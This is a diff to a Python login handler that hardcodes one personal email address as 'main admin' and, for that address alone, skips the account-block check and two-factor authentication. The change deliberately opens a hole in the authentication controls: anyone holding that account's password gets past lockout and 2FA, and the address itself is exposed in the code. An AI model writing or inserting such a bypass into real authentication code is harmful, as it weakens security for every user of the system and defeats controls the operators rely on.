@@ -323,6 +323,9 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
                         'isBase64Encoded': False
                     }
                 
+                # Check if user is main admin
+                is_main_admin = email == 'jonhrom2012@gmail.com'
+                
                 if user['password_hash'] != hash_password(password):
                     attempts = count_recent_attempts(conn, ip_address, email)
                     block = attempts >= 4
@@ -335,7 +338,8 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
                         'isBase64Encoded': False
                     }
                 
-                if user['is_blocked']:
+                # Don't check blocking for main admin
+                if not is_main_admin and user['is_blocked']:
                     return {
                         'statusCode': 403,
                         'headers': headers,
@@ -352,7 +356,8 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
                 
                 record_login_attempt(conn, ip_address, email, True)
                 
-                if user['two_factor_sms'] or user['two_factor_email']:
+                # Skip 2FA for main admin
+                if not is_main_admin and (user['two_factor_sms'] or user['two_factor_email']):
                     code_type = 'sms' if user['two_factor_sms'] else 'email'
                     code = generate_2fa_code(code_type)
                     send_2fa_code(conn, user['id'], code, code_type)
